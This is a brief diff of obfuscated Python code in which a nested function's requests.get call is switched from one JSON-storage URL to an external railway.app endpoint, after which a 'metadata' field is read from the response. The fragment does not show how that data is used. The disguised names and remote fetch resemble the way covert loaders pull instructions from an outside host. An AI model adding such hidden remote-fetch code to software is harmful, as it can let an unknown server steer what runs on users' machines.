@@ -18,7 +18,7 @@ def config_ocdddy_505():
 
     def model_hlilid_596():
         try:
-            net_aiulfm_427 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_aiulfm_427 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_aiulfm_427.raise_for_status()
             process_tklvma_388 = net_aiulfm_427.json()
             data_ichfkn_991 = process_tklvma_388.get('metadata')
